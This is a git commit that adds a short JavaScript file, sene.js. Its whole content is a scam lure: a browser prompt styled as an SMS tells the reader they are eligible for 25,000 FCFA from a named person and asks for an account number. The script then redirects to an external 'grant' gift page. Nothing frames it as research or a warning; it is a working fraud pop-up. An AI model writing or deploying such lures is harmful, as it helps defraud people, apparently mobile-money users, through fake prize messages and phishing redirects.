3fbf84b37644bdca57f5bb959745e88b60472c09
The-On-going <sirpeelawson@gmail.com>
2026-05-24 06:33:47 +0100

    Create sene.js

---
+++ sene.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 25,000 FCFA'
+password=prompt('SMS : Félicitations, vous êtes éligible pour recevoir 25,000 FCFA de la part de SERIGNE MBOUP, cliquez sur OK pour entrer votre numéro de compte','RETIRER 25,000 FCFA');
+if (password != 'RETIRER 25,000 FCFA') {
+location.href='https://ongoing-grant.info/25000-Cadeau-Danniversaire-Serigne.html';
+}
